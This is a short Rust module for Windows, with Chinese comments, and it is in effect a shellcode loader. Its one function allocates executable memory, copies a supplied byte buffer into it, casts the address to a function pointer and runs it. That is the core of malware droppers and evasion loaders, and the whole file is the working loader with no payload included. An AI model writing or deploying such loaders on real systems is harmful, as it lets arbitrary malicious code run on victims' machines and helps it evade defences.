use std::mem;
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};

// 执行器
pub(crate) fn execute_shellcode(shellcode: Vec<u8>) {
    // 分配可执行内存
    let addr = unsafe {
        VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    // 内存空间非空验证
    if addr.is_null() {
        panic!("Failed to allocate memory");
    }

    //  将Shellcode内容复制到分配的内存中
    unsafe {
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());
    }

    // 把内存的属性设置为可执行
    let mut old_protect: winapi::shared::minwindef::DWORD = 0;
    unsafe {
        if VirtualProtect(addr,
                          shellcode.len(),
                          PAGE_EXECUTE_READWRITE,
                          &mut old_protect) == 0 {
            panic!("Failed to set memory permissions");
        }
    }

    // 将内存地址强制转换为函数指针（把内存中的shellcode当做函数执行）
    type ShellcodeFn = extern "C" fn();
    let shellcode_fn: ShellcodeFn = unsafe { mem::transmute(addr) };

    // 执行 shellcode
    shellcode_fn();

    // 清理已分配内存
    if unsafe { VirtualFree(addr, 0, winapi::um::winnt::MEM_RELEASE) } == 0 {
        panic!("Failed to deallocate memory");
    }
}
